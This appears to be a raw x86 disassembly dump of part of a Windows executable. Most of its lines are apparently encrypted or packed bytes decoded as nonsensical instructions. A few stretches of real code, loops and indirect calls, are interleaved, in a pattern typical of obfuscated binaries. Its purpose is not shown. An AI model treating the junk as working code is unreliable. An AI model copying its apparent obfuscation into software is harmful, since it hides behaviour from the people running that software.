  4018c4:	popf   
  4018c5:	or     cl,dl
  4018c7:	imul   edi,esp,0xffffffc8
  4018ca:	je     0x401892
  4018cc:	out    0xf4,eax
  4018ce:	xchg   esp,eax
  4018cf:	stos   BYTE PTR es:[edi],al
  4018d0:	inc    ebx
  4018d1:	repz icebp 
  4018d3:	ss in  al,dx
  4018d5:	jg     0x401891
  4018d7:	mov    ds:0x4e6884a8,eax
  4018dc:	and    esp,0x88a0da26
  4018e2:	sbb    esi,DWORD PTR [eax]
  4018e4:	and    al,0x6e
  4018e6:	dec    ebx
  4018e7:	outs   dx,BYTE PTR ds:[esi]
  4018e8:	or     ebp,DWORD PTR [ebp+0x35]
  4018eb:	leave  
  4018ec:	adc    cl,BYTE PTR [ebp+0x4812ccb1]
  4018f2:	lea    eax,[edi-0x59580ad4]
  4018f8:	out    0xf5,eax
  4018fa:	inc    eax
  4018fb:	cdq    
  4018fc:	add    DWORD PTR [eax-0x1f],edi
  4018ff:	je     0x40192f
  401901:	jb     0x401966
  401903:	or     cl,ch
  401905:	and    al,0x96
  401907:	rcr    dh,0xe
  40190a:	xchg   edi,eax
  40190b:	repz fbld TBYTE PTR [esp+ecx*8-0x4c]
  401910:	into   
  401911:	pop    ebp
  401912:	fnstsw WORD PTR [ebx]
  401914:	xor    DWORD PTR [eax-0x7a3059b6],ecx
  40191a:	pop    es
  40191b:	mov    dl,0x23
  40191d:	into   
  40191e:	fcomp  QWORD PTR [ecx]
  401920:	and    cl,dh
  401922:	aaa    
  401923:	and    cl,0x83
  401926:	rep stos BYTE PTR es:[edi],al
  401928:	adc    ah,BYTE PTR [edx-0x3ca4ebc5]
  40192e:	aad    0x81
  401930:	mov    ch,0x39
  401932:	jmp    0x5209:0x6a6afebc
  401939:	adc    al,0x7c
  40193b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40193c:	mov    ebp,ebp
  40193e:	or     ebx,DWORD PTR [ebp-0x3]
  401941:	cli    
  401942:	lods   eax,DWORD PTR ds:[esi]
  401943:	inc    ebp
  401944:	(bad)  
  401945:	dec    esi
  401946:	or     ch,ah
  401948:	je     0x401919
  40194a:	adc    DWORD PTR [edx-0x2c],eax
  40194d:	adc    bh,0x81
  401950:	shl    DWORD PTR [ebp+edx*2+0x430fb30a],0xbd
  401958:	mov    al,ds:0x6e8a0042
  40195d:	mov    al,ds:0x9ad548da
  401962:	imul   edx,DWORD PTR [ebx-0x8],0x826244a5
  401969:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40196a:	mov    ch,0xc0
  40196c:	xlat   BYTE PTR ds:[ebx]
  40196d:	xor    esi,esp
  40196f:	xor    ecx,DWORD PTR [ebp+ecx*4+0x63809f15]
  401976:	push   edi
  401977:	sbb    eax,edi
  401979:	xor    ecx,DWORD PTR [edx-0x60]
  40197c:	es push ebp
  40197e:	arpl   bx,ax
  401980:	dec    edi
  401981:	fiadd  WORD PTR [ebx]
  401983:	(bad)  
  401984:	mov    DWORD PTR [ecx],eax
  401986:	sbb    ecx,ecx
  401988:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  40198f:	lea    eax,[ebp-0x14]
  401992:	jmp    0x401c31
  401997:	xlat   BYTE PTR ds:[ebx]
  401998:	ret    
  401999:	ds ret 0xc1da
  40199d:	fcmovnu st,st(1)
  40199f:	loope  0x4019b4
  4019a1:	xchg   ch,dh
  4019a3:	xor    dh,BYTE PTR [ecx-0x25]
  4019a6:	into   
  4019a7:	add    BYTE PTR [ecx],0x78
  4019aa:	js     0x4019aa
  4019ac:	jle    0x401a26
  4019ae:	js     0x4019e1
  4019b0:	pop    ebx
  4019b1:	xchg   esp,eax
  4019b2:	mov    al,ds:0xcfca5e1d
  4019b7:	enter  0x40d3,0x47
  4019bb:	popa   
  4019bc:	icebp  
  4019bd:	inc    edx
  4019be:	sub    ah,ah
  4019c0:	sbb    dh,BYTE PTR [esi-0x54]
  4019c3:	imul   ebp,ebp,0xafae3f8b
  4019c9:	mov    eax,0x2ec498a9
  4019ce:	cmp    edi,ebp
  4019d0:	ret    
  4019d1:	push   0x517fe2ba
  4019d6:	adc    al,0x26
  4019d8:	jmp    0xfd6:0x6661c6f6
  4019df:	retf   0x2447
  4019e2:	stos   BYTE PTR es:[edi],al
  4019e3:	xchg   esp,eax
  4019e4:	icebp  
  4019e5:	or     al,bh
  4019e7:	inc    ebp
  4019e8:	xchg   edi,eax
  4019e9:	dec    esi
  4019ea:	jmp    0x407b7ae5
  4019ef:	mov    edi,0x860f9d2e
  4019f4:	in     al,0x12
  4019f6:	sbb    eax,0x387d6f0a
  4019fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4019fc:	push   esi
  4019fd:	or     esp,DWORD PTR [esi+edx*8-0x6c]
  401a01:	push   es
  401a02:	dec    ebp
  401a03:	inc    eax
  401a04:	lods   al,BYTE PTR ds:[esi]
  401a05:	fdiv   DWORD PTR [ebp+eax*8-0x75]
  401a09:	xor    BYTE PTR [ebp+0x53],dh
  401a0c:	xor    dh,dl
  401a0e:	icebp  
  401a0f:	mov    eax,cs:0x49fcf03e
  401a15:	pop    esp
  401a16:	cmc    
  401a17:	sti    
  401a18:	adc    dl,BYTE PTR [ecx+ecx*4]
  401a1b:	mov    edi,0x71ad3077
  401a20:	dec    ecx
  401a21:	ret    
  401a22:	inc    edx
  401a23:	or     cl,dh
  401a25:	dec    esp
  401a26:	lock sub BYTE PTR [eax],dh
  401a29:	dec    eax
  401a2a:	into   
  401a2b:	call   0x306d03e
  401a30:	mov    ah,0xc3
  401a32:	rol    al,0x77
  401a35:	int    0x54
  401a37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a38:	test   cl,cl
  401a3a:	nop    ebp
  401a3d:	sub    BYTE PTR [esi+ecx*8+0x2550a95a],0x9c
  401a45:	mov    ds:0x3c66436b,al
  401a4a:	lock cmc 
  401a4c:	cmc    
  401a4d:	mov    es,esp
  401a4f:	cwde   
  401a50:	rcr    BYTE PTR [ecx-0x2e36e24],0x1
  401a57:	push   es
  401a58:	out    dx,eax
  401a59:	mov    al,ds:0x40b598
  401a5e:	inc    ebp
  401a5f:	cdq    
  401a60:	dec    edi
  401a61:	rcr    DWORD PTR [ebp-0x70],1
  401a64:	mov    eax,0x7553ff5d
  401a69:	mov    bl,0x87
  401a6b:	and    bl,cl
  401a6d:	test   DWORD PTR [edi],0xb88baa37
  401a73:	and    al,0xd
  401a75:	mov    ebx,0x3401f82
  401a7a:	jno    0x401a06
  401a7c:	dec    edx
  401a7d:	sub    DWORD PTR [ecx],edi
  401a7f:	mov    ah,0x92
  401a81:	jns    0x401a35
  401a83:	fld    TBYTE PTR [ecx-0x18]
  401a86:	adc    eax,0x7b5480a0
  401a8b:	mov    esp,0xbffa9c73
  401a90:	mov    ds:0x21cc583a,al
  401a95:	jb     0x401aaa
  401a97:	ret    
  401a98:	dec    ebx
  401a99:	inc    ebp
  401a9a:	mov    ebp,0x701ee079
  401a9f:	mov    bl,BYTE PTR [eax]
  401aa1:	xchg   esp,eax
  401aa2:	cdq    
  401aa3:	mov    ds:0xc5c58de2,al
  401aa8:	xchg   DWORD PTR [ebp+0x49],ebx
  401aab:	int3   
  401aac:	sbb    ah,BYTE PTR [eax]
  401aae:	arpl   WORD PTR [ecx+esi*4+0x73],sp
  401ab2:	repnz pop eax
  401ab4:	lea    esp,[ebx]
  401ab6:	ds retf 
  401ab8:	lods   eax,DWORD PTR ds:[esi]
  401ab9:	mov    dh,0xa1
  401abb:	and    eax,0xcfe6609e
  401ac0:	xchg   ch,al
  401ac2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ac3:	cli    
  401ac4:	jge    0x401a4d
  401ac6:	jle    0x401b04
  401ac8:	dec    edi
  401ac9:	mov    edi,DWORD PTR [ebp+0x16]
  401acc:	(bad)  
  401acd:	ror    BYTE PTR [ebx],1
  401acf:	mov    bh,0xd5
  401ad1:	sub    BYTE PTR [ebp-0x61f1592c],bh
  401ad7:	inc    eax
  401ad8:	arpl   WORD PTR [ecx+0x5beeafce],sp
  401ade:	xor    al,0xbf
  401ae0:	mov    al,0xf7
  401ae2:	or     eax,0x195cb405
  401ae7:	pop    ebx
  401ae8:	xor    eax,0x2f34ff0a
  401aed:	mov    eax,0xb1181758
  401af2:	nop
  401af3:	sbb    edi,ebx
  401af5:	inc    edx
  401af6:	mov    WORD PTR [edi+ecx*2-0x52],ds
  401afa:	push   edi
  401afb:	mov    dh,0xe2
  401afd:	sub    ch,BYTE PTR [eax+0x2f]
  401b00:	loope  0x401b08
  401b02:	xor    dh,dl
  401b04:	xchg   ebp,eax
  401b05:	pusha  
  401b06:	mov    al,0x39
  401b08:	(bad)  
  401b09:	ror    BYTE PTR [esi],1
  401b0b:	js     0x401b37
  401b0d:	ins    BYTE PTR es:[edi],dx
  401b0e:	int3   
  401b0f:	dec    edx
  401b10:	sbb    al,0xc6
  401b12:	or     BYTE PTR [eax+0x70],al
  401b15:	xchg   edx,eax
  401b16:	mov    esp,0x1e7faf57
  401b1b:	or     BYTE PTR [edi-0x42d22d46],dl
  401b21:	pushf  
  401b22:	mov    eax,0x7a406f69
  401b27:	push   edi
  401b28:	(bad)  
  401b29:	aas    
  401b2a:	lods   eax,DWORD PTR ds:[esi]
  401b2b:	sar    ch,1
  401b2d:	mov    bh,0xcc
  401b2f:	sbb    bh,dh
  401b31:	sub    esp,ebp
  401b33:	fld    DWORD PTR [ecx-0x9643217]
  401b39:	sar    BYTE PTR [edi-0x109ff2bd],1
  401b3f:	dec    ebx
  401b40:	(bad)  
  401b41:	jl     0x401ac7
  401b43:	mov    ecx,ds
  401b45:	mov    al,ds:0x8c133be4
  401b4a:	dec    edx
  401b4b:	push   ebp
  401b4c:	xor    eax,DWORD PTR [esi+0x4]
  401b4f:	retf   
  401b50:	add    edi,ecx
  401b52:	js     0x401b58
  401b54:	ss pop ebx
  401b56:	mov    dh,BYTE PTR [edi+0x2f]
  401b59:	sbb    ebp,ebp
  401b5b:	retf   
  401b5c:	daa    
  401b5d:	popf   
  401b5e:	sar    BYTE PTR [ebx+0x46b361a9],0x7b
  401b65:	add    dh,BYTE PTR [edi]
  401b67:	mov    WORD PTR [edi-0x44b3fcb4],fs
  401b6d:	mov    BYTE PTR [ebp+0x5ab76f04],al
  401b73:	mov    ds:0x37d9086a,eax
  401b78:	sbb    eax,0x117195bb
  401b7d:	pop    edx
  401b7e:	cmp    BYTE PTR [eax-0x19a1e84e],dh
  401b84:	into   
  401b85:	mov    BYTE PTR [ebp-0x4b1deb99],bl
  401b8b:	push   eax
  401b8c:	xor    BYTE PTR [edx+edx*2-0x1a88e75f],ch
  401b93:	dec    ebp
  401b94:	or     BYTE PTR [esi+0x150419e1],cl
  401b9a:	out    0xa1,al
  401b9c:	xchg   edx,eax
  401b9d:	retf   
  401b9e:	jno    0x401b50
  401ba0:	leave  
  401ba1:	mov    BYTE PTR gs:[edi],bl
  401ba4:	dec    edx
  401ba5:	(bad)  
  401ba6:	xor    dh,dh
  401ba8:	aaa    
  401ba9:	ror    DWORD PTR [ebx-0x4e393be3],0xe0
  401bb0:	mov    al,0xbe
  401bb2:	retf   
  401bb3:	loope  0x401bf2
  401bb5:	shl    al,1
  401bb7:	inc    ecx
  401bb8:	sar    BYTE PTR [ecx+0x26],1
  401bbb:	pop    esp
  401bbc:	jle    0x401c12
  401bbe:	enter  0xe9b1,0xfb
  401bc2:	fild   WORD PTR [edi+0x2c]
  401bc5:	arpl   WORD PTR [edx-0x71],bp
  401bc8:	popf   
  401bc9:	and    al,BYTE PTR [edi+0x55f5e309]
  401bcf:	mov    al,ds:0x7892645
  401bd4:	arpl   WORD PTR [edi+0x50],bx
  401bd7:	jl     0x401c1e
  401bd9:	mov    edi,0xc75e392d
  401bde:	cmp    DWORD PTR [edx],edx
  401be0:	int    0xcb
  401be2:	enter  0x749b,0xf6
  401be6:	fcom   QWORD PTR [ebp+0x6641ed2]
  401bec:	dec    ebx
  401bed:	inc    esp
  401bee:	das    
  401bef:	pusha  
  401bf0:	adc    esp,eax
  401bf2:	sub    eax,0x54ebbd89
  401bf7:	imul   esp,DWORD PTR [edx-0xdb8253c],0xfffffffb
  401bfe:	add    al,0x10
  401c00:	jecxz  0x401c01
  401c02:	mov    edi,0xd1b7f564
  401c07:	xchg   esi,eax
  401c08:	int    0x3b
  401c0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c0b:	jb     0x401c45
  401c0d:	shl    BYTE PTR [edi],cl
  401c0f:	call   0x51d6:0xaeb34166
  401c16:	je     0x401c2e
  401c18:	(bad)  
  401c19:	jmp    0x401ba0
  401c1b:	push   esp
  401c1c:	push   ss
  401c1d:	fst    QWORD PTR [edx+ecx*4+0x1a]
  401c21:	jno    0x401ba4
  401c23:	test   al,0x2
  401c25:	push   edi
  401c26:	push   ebx
  401c27:	call   0x435e:0xc5953040
  401c2e:	gs out 0x1e,eax
  401c31:	mov    DWORD PTR [ebp-0x20],eax
  401c34:	and    DWORD PTR ds:0x42a85d,0x0
  401c3e:	jmp    0x401c4e
  401c43:	mov    eax,ds:0x42a85d
  401c48:	inc    eax
  401c49:	mov    ds:0x42a85d,eax
  401c4e:	cmp    DWORD PTR ds:0x42a85d,0x18
  401c55:	jae    0x401c9b
  401c5b:	cmp    DWORD PTR ds:0x42a85d,0xa
  401c62:	jne    0x401c7b
  401c68:	push   0x6bd9
  401c6d:	push   DWORD PTR [ebp-0x1c]
  401c70:	push   0x42aa4e
  401c75:	call   DWORD PTR ds:0x41d0bc
  401c7b:	cmp    DWORD PTR ds:0x42a85d,0x9
  401c82:	jne    0x401c96
  401c88:	xor    eax,eax
  401c8a:	xor    eax,DWORD PTR ds:0x42a85d
  401c90:	inc    eax
  401c91:	mov    ds:0x42a85d,eax
  401c96:	jmp    0x401c43
  401c9b:	mov    eax,DWORD PTR [ebp-0x14]
  401c9e:	sbb    DWORD PTR ds:0x42a781,0x47a9
  401ca8:	mov    ecx,DWORD PTR [ebp-0x20]
  401cab:	dec    DWORD PTR ds:0x42a795
  401cb1:	xor    eax,esi
  401cb3:	add    eax,edi
  401cb5:	mov    DWORD PTR [ecx],eax
  401cb7:	movzx  eax,WORD PTR ds:0x42a789
  401cbe:	and    eax,DWORD PTR ds:0x42a7d9
  401cc4:	mov    ds:0x42a789,eax
  401cc9:	mov    eax,ds:0x41ebba
  401cce:	mov    ebx,0x8e12febf
  401cd3:	adc    DWORD PTR ds:0x42a819,0x42a821
  401cdd:	mov    DWORD PTR [ebp-0xc],ebx
  401ce0:	xor    DWORD PTR ds:0x42a79d,0x1391
  401cea:	mov    eax,DWORD PTR [eax]
  401cec:	mov    cx,WORD PTR [ebp-0x4]
  401cf0:	movzx  ecx,cx
  401cf3:	jmp    0x401f92
  401cf8:	retf   
  401cf9:	iret   
  401cfa:	cmp    al,0x3d
  401cfc:	aam    0xd1
  401cfe:	leave  
  401cff:	fldcw  WORD PTR [edx-0x16]
  401d02:	retf   0x21ba
  401d05:	sar    BYTE PTR [ecx],1
  401d07:	or     eax,0x78780600
  401d0c:	(bad)  
  401d0d:	jle    0x401d87
  401d0f:	js     0x401d74
  401d11:	into   
  401d12:	jmp    0x4068:0xed498aa3
  401d19:	leave  
  401d1a:	test   al,0xc0
  401d1c:	push   0xbf079c18
  401d21:	sub    eax,0xab74314f
  401d26:	dec    ebx
  401d27:	nop
  401d28:	cwde   
  401d29:	fs mov ebp,0x65acae2b
  401d2f:	cmp    eax,0xc4a7fa2f
  401d34:	sbb    DWORD PTR [eax-0x7995bade],0x45
  401d3b:	je     0x401d7d
  401d3d:	fcomp  QWORD PTR [esi+0x4e1af38b]
  401d43:	mov    ds:0xe410ddd1,al
  401d48:	sub    eax,0x7bd6bed4
  401d4d:	push   ds
  401d4e:	pop    eax
  401d4f:	cmp    BYTE PTR [ebx-0x2a10c9e9],0xcf
  401d56:	out    dx,eax
  401d57:	xchg   esp,eax
  401d58:	mov    eax,0xb9a335e5
  401d5d:	mov    dh,0x9f
  401d5f:	and    ch,al
  401d61:	mov    edx,0x6e33206
  401d66:	xchg   ecx,eax
  401d67:	hlt    
  401d68:	retf   
  401d69:	and    BYTE PTR [ebx+0x71c6078c],cl
  401d6f:	test   al,0x51
  401d71:	int    0xae
  401d73:	outs   dx,DWORD PTR ds:[esi]
  401d74:	and    edx,esp
  401d76:	jg     0x401d53
  401d78:	jmp    0x401df0
  401d7a:	xor    edx,edx
  401d7c:	jne    0x401d47
  401d7e:	shld   DWORD PTR [eax-0x447a035c],ecx,cl
  401d85:	jmp    0x401d0c
  401d87:	lahf   
  401d88:	add    bh,0x6c
  401d8b:	scas   eax,DWORD PTR es:[edi]
  401d8c:	jne    0x401d5b
  401d8e:	sahf   
  401d8f:	leave  
  401d90:	icebp  
  401d91:	shl    BYTE PTR [ecx-0x7d],cl
  401d94:	and    DWORD PTR [esi*1+0x711765b5],eax
  401d9b:	push   es
  401d9c:	jns    0x401db2
  401d9e:	(bad)  
  401d9f:	ds (bad) 
  401da1:	jle    0x401d31
  401da3:	inc    eax
  401da4:	aam    0x1a
  401da6:	pop    edx
  401da7:	adc    BYTE PTR [esi+0x700d6e0d],0xf4
  401dae:	call   FWORD PTR [eax+0x1d]
  401db1:	call   0x3891:0x7b7d471
  401db8:	out    dx,al
  401db9:	mov    al,0xff
  401dbb:	xor    DWORD PTR [edi-0xe],0x370c5d23
  401dc2:	mov    dl,BYTE PTR [eax-0x54]
  401dc5:	loop   0x401d88
  401dc7:	dec    eax
  401dc8:	add    al,al
  401dca:	jmp    0x401dd4
  401dcc:	loope  0x401d9d
  401dce:	std    
  401dcf:	pop    esi
  401dd0:	jno    0x401d81
  401dd2:	add    BYTE PTR ds:0xd4c54a83,ah
  401dd8:	add    eax,0x4de2f048
  401ddd:	sub    edi,DWORD PTR [ecx+0x72a3dec6]
  401de3:	push   ebx
  401de4:	test   bh,0xf5
  401de7:	mov    dl,0x8b
  401de9:	aas    
  401dea:	lods   eax,DWORD PTR ds:[esi]
  401deb:	ret    
  401dec:	dec    edi
  401ded:	ins    DWORD PTR es:[edi],dx
  401dee:	fcomip st,st(1)
  401df0:	es inc ebx
  401df2:	jne    0x401e6e
  401df4:	stos   DWORD PTR es:[edi],eax
  401df5:	aas    
  401df6:	fs xchg ebp,eax
  401df8:	cmp    al,0xd4
  401dfa:	push   eax
  401dfb:	icebp  
  401dfc:	jmp    0x401e4f
  401dfe:	lahf   
  401dff:	inc    esp
  401e00:	xchg   esp,eax
  401e01:	neg    al
  401e03:	or     cl,BYTE PTR [ebp+0x6a1e52c]
  401e09:	icebp  
  401e0a:	scas   eax,DWORD PTR es:[edi]
  401e0b:	jmp    0xc7c899c8
  401e10:	mov    bh,0xc4
  401e12:	mov    edx,es
  401e14:	inc    edx
  401e15:	mov    ebp,0x74e387a6
  401e1a:	in     al,0x15
  401e1c:	sub    dl,BYTE PTR [eax-0x5d]
  401e1f:	mov    edx,0xef302bb6
  401e24:	je     0x401e17
  401e26:	jb     0x401e4f
  401e28:	push   edx
  401e29:	stos   BYTE PTR es:[edi],al
  401e2a:	lods   eax,DWORD PTR ds:[esi]
  401e2b:	jae    0x401e4c
  401e2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e2e:	dec    ebx
  401e2f:	pop    esi
  401e30:	pop    es
  401e31:	and    DWORD PTR [ecx],ebp
  401e33:	cld    
  401e34:	xor    esp,DWORD PTR [edx+0x2]
  401e37:	hlt    
  401e38:	sub    edx,DWORD PTR [ebp-0x393ca5f0]
  401e3e:	popf   
  401e3f:	lods   al,BYTE PTR ds:[esi]
  401e40:	xchg   DWORD PTR [ebp-0x8ad3f89],edi
  401e46:	in     al,dx
  401e47:	test   ch,bh
  401e49:	div    esp
  401e4b:	dec    edx
  401e4c:	(bad)  
  401e4d:	sbb    al,0x88
  401e4f:	xor    esi,ebp
  401e51:	xor    al,bh
  401e53:	add    esi,DWORD PTR [esi-0x6a]
  401e56:	mov    bl,0xfc
  401e58:	jmp    0x2fcda7ae
  401e5d:	imul   edx,DWORD PTR [ebx],0x425af58a
  401e63:	fsub   QWORD PTR [edi]
  401e65:	mov    bh,0x53
  401e67:	push   edx
  401e68:	mov    WORD PTR [edi],es
  401e6a:	inc    ecx
  401e6b:	or     BYTE PTR [eax+0x41],dh
  401e6e:	fcom   QWORD PTR fs:[esi+0x22268123]
  401e75:	pusha  
  401e76:	sti    
  401e77:	cmp    ecx,DWORD PTR [ecx+0x712d6734]
  401e7d:	out    dx,al
  401e7e:	dec    ecx
  401e7f:	and    BYTE PTR [ebp-0x6a49f785],al
  401e85:	dec    esi
  401e86:	rol    DWORD PTR [edx-0x9ed1932],cl
  401e8c:	pop    eax
  401e8d:	imul   edi,DWORD PTR [eax-0xca1760e],0x41945650
  401e97:	retf   0x6b38
  401e9a:	add    esi,DWORD PTR [eax-0x57cd3a8f]
  401ea0:	mov    cl,0x5b
  401ea2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ea3:	mov    dl,0x7c
  401ea5:	add    DWORD PTR [ecx],ebx
  401ea7:	xchg   DWORD PTR [ecx],ebx
  401ea9:	adc    esp,eax
  401eab:	push   es
  401eac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ead:	imul   esp,ebx,0x74
  401eb0:	jg     0x401ebc
  401eb2:	mov    ds:0x9e357e92,al
  401eb7:	or     eax,0x1fa06fdb
  401ebc:	xor    dh,BYTE PTR [edx-0x3329104]
  401ec2:	loope  0x401e69
  401ec4:	fstp   DWORD PTR [ebx+0x7730f1b3]
  401eca:	jae    0x401e4d
  401ecc:	inc    ecx
  401ecd:	adc    BYTE PTR [ebp-0x3],ah
  401ed0:	cmp    eax,0x75770b22
  401ed5:	pop    edx
  401ed6:	jmp    0x1b6e5017
  401edb:	stos   BYTE PTR es:[edi],al
  401edc:	sbb    BYTE PTR [eax],dl
  401ede:	fnstenv [ecx]
  401ee0:	into   
  401ee1:	pop    eax
  401ee2:	rcl    DWORD PTR [edi+0x10],1
  401ee5:	loopne 0x401f36
  401ee7:	outs   dx,DWORD PTR ds:[esi]
  401ee8:	and    eax,0x35621ea7
  401eed:	lock ror bh,cl
  401ef0:	add    dl,0x33
  401ef3:	jno    0x401f52
  401ef5:	adc    esi,0xc08912f7
  401efb:	ror    DWORD PTR [esp+edx*1],1
  401efe:	dec    edi
  401eff:	mov    DWORD PTR [esi+0x25],ecx
  401f02:	fstp   QWORD PTR [ecx+0x23106b82]
  401f08:	ss adc al,0xb1
  401f0b:	loopne 0x401ec7
  401f0d:	mov    ch,0x2a
  401f0f:	in     al,dx
  401f10:	rcl    DWORD PTR [ebp-0x65],1
  401f13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f14:	jmp    0x654f2c08
  401f19:	vpsubusb ymm0,ymm4,YMMWORD PTR [ebx]
  401f1d:	lock ins DWORD PTR es:[edi],dx
  401f1f:	into   
  401f20:	adc    dh,BYTE PTR [ebx+0x6f3aeaeb]
  401f26:	mov    bl,0xf
  401f28:	push   esp
  401f29:	push   ebx
  401f2a:	mov    bl,0x56
  401f2c:	in     al,dx
  401f2d:	mov    esi,0x8705bd7c
  401f32:	jmp    0x35f0c54c
  401f37:	shr    DWORD PTR [ecx+0x12],0xf7
  401f3b:	pop    ecx
  401f3c:	add    al,0x35
  401f3e:	scas   al,BYTE PTR es:[edi]
  401f3f:	xlat   BYTE PTR ds:[ebx]
  401f40:	pop    ebx
  401f41:	loope  0x401f2b
  401f43:	push   0x1a
  401f45:	jbe    0x401f7e
  401f47:	outs   dx,DWORD PTR ds:[esi]
  401f48:	and    DWORD PTR [eax+0x7c9a499b],0x1e
  401f4f:	jg     0x401f14
  401f51:	add    dh,BYTE PTR [edx+0x4d2f6c6d]
  401f57:	sub    al,0x84
  401f59:	sub    dl,BYTE PTR [ebp+0x20312fb8]
  401f5f:	adc    DWORD PTR [edx],ebp
  401f61:	mov    ds:0x4de99fd7,eax
  401f66:	push   eax
  401f67:	xor    dh,BYTE PTR [eax-0x7]
  401f6a:	ja     0x401f2f
  401f6c:	les    ebp,FWORD PTR [esp+edi*1]
  401f6f:	inc    esi
  401f70:	adc    DWORD PTR [edx-0x6e],ebx
  401f73:	xor    BYTE PTR [edi-0x1daab893],ah
  401f79:	mov    al,ds:0x448249ff
  401f7e:	seta   BYTE PTR [esi+0x6c]
  401f82:	ins    DWORD PTR es:[edi],dx
  401f83:	jmp    0x6cd4:0x7751482f
  401f8a:	lahf   
  401f8b:	popa   
  401f8c:	loope  0x401fca
  401f8e:	mov    al,0x8
  401f90:	out    dx,al
  401f91:	add    ecx,DWORD PTR gs:[eax]
  401f94:	xor    eax,eax
  401f96:	add    eax,DWORD PTR ds:0x42a859
  401f9c:	and    eax,DWORD PTR ds:0x42a8a9
  401fa2:	mov    ds:0x42a859,eax
  401fa7:	mov    DWORD PTR [ebp-0x18],ecx
  401faa:	add    DWORD PTR ds:0x42a811,0x598
  401fb4:	mov    eax,DWORD PTR [ebp+0x8]
  401fb7:	and    DWORD PTR ds:0x42a779,0x0
  401fc1:	jmp    0x401fd3
  401fc6:	mov    ecx,DWORD PTR ds:0x42a779
  401fcc:	inc    ecx
  401fcd:	mov    DWORD PTR ds:0x42a779,ecx
  401fd3:	cmp    DWORD PTR ds:0x42a779,0x11
  401fda:	jae    0x402003
  401fe0:	cmp    DWORD PTR ds:0x42a779,0x1b
  401fe7:	jne    0x401ffe
  401fed:	push   0x275b
  401ff2:	push   DWORD PTR [ebp-0x20]
  401ff5:	push   DWORD PTR [ebp-0x28]
  401ff8:	call   DWORD PTR ds:0x41d184
  401ffe:	jmp    0x401fc6
  402003:	mov    ecx,DWORD PTR [ebp-0x8]
  402006:	jmp    0x4022a5
  40200b:	rcl    cl,0xcf
  40200e:	ret    
  40200f:	fld    st(1)
  402011:	aam    0xd9
  402013:	push   ecx
  402014:	shl    bh,1
  402016:	cmp    DWORD PTR [ebx-0x24],eax
  402019:	push   edi
  40201a:	and    eax,DWORD PTR [esi-0x18787fc]
  402020:	jle    0x40209a
  402022:	js     0x402037
  402024:	jle    0x40201e
  402026:	int    0x29
  402028:	ret    
  402029:	gs jl  0x402047
  40202c:	enter  0x7d7c,0x7b
  402030:	jb     0x40204d
  402032:	fcmovne st,st(2)
  402034:	scas   al,BYTE PTR es:[edi]
  402035:	cmp    eax,DWORD PTR [edi-0x9ad119a]
  40203b:	fwait
  40203c:	int    0xfc
  40203e:	(bad)  
  40203f:	xor    eax,0x69efa73
  402044:	xchg   ecx,eax
  402045:	outs   dx,BYTE PTR ds:[esi]
  402046:	inc    esp
  402047:	mov    BYTE PTR [ecx-0x34f68b9],bl
  40204d:	outs   dx,DWORD PTR ds:[esi]
  40204e:	and    esp,DWORD PTR ds:[ebx]
  402051:	cdq    
  402052:	mov    dh,BYTE PTR [ebx]
  402054:	les    esi,FWORD PTR [eax]
  402056:	scas   eax,DWORD PTR es:[edi]
  402057:	sbb    DWORD PTR [ecx-0x12a2a528],ebp
  40205d:	or     ch,BYTE PTR [ebx]
  40205f:	out    0xa1,eax
  402061:	(bad)  
  402062:	pop    esi
  402063:	cvtps2pi mm5,QWORD PTR [ecx]
  402066:	hlt    
  402067:	aad    0x30
  402069:	gs (bad) 
  40206b:	jg     0x4020e0
  40206d:	xor    eax,0xe143f57a
  402072:	inc    eax
  402073:	sbb    DWORD PTR [ebp+0x3a],edx
  402076:	or     ebx,DWORD PTR [edi+eax*1]
  402079:	cmp    bl,BYTE PTR [edi*1+0x6d9f4374]
  402080:	imul   esp,edx,0x64dd70b6
  402086:	mov    dh,0xf0
  402088:	test   BYTE PTR [ebp-0x4ea1c31e],cl
  40208e:	out    dx,eax
  40208f:	mov    ch,0x22
  402091:	mov    dl,0x61
  402093:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402094:	xchg   ebx,eax
  402095:	sub    al,0xce
  402097:	lds    edx,FWORD PTR [ebp+0x60]
  40209a:	(bad)  
  40209b:	call   0xd050f6b5
  4020a0:	fdiv   QWORD PTR [ecx]
  4020a2:	pusha  
  4020a3:	mov    dl,0x7a
  4020a5:	fcom   QWORD PTR [esi-0x5574869a]
  4020ab:	push   ss
  4020ac:	daa    
  4020ad:	cld    
  4020ae:	(bad)  
  4020b0:	out    dx,al
  4020b1:	sub    ebp,DWORD PTR [eax+0x3a6d2daa]
  4020b7:	lods   al,BYTE PTR ds:[esi]
  4020b8:	test   eax,0x24e6bd18
  4020bd:	push   ebp
  4020be:	dec    ebp
  4020bf:	ins    DWORD PTR es:[edi],dx
  4020c0:	jge    0x4020b9
  4020c2:	das    
  4020c3:	lods   eax,DWORD PTR ds:[esi]
  4020c4:	mov    edi,0xd5d28f1
  4020c9:	retf   
  4020ca:	lock stc 
  4020cc:	cmp    eax,0x4f8264ab
  4020d1:	fbld   TBYTE PTR [ebx+0x3c]
  4020d4:	leave  
  4020d5:	or     al,0x9b
  4020d7:	stos   BYTE PTR es:[edi],al
  4020d8:	sbb    BYTE PTR [ecx-0x77],dl
  4020db:	adc    bl,BYTE PTR [edi]
  4020dd:	je     0x402081
  4020df:	xchg   esp,eax
  4020e0:	inc    edx
  4020e1:	add    al,0xa2
  4020e3:	icebp  
  4020e4:	jge    0x402123
  4020e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4020e7:	push   esp
  4020e8:	into   
  4020e9:	adc    ah,BYTE PTR [eax-0x1]
  4020ec:	addr16 popf 
  4020ee:	adc    cl,cl
  4020f0:	lods   al,BYTE PTR ds:[esi]
  4020f1:	mov    BYTE PTR [edi],dl
  4020f3:	popf   
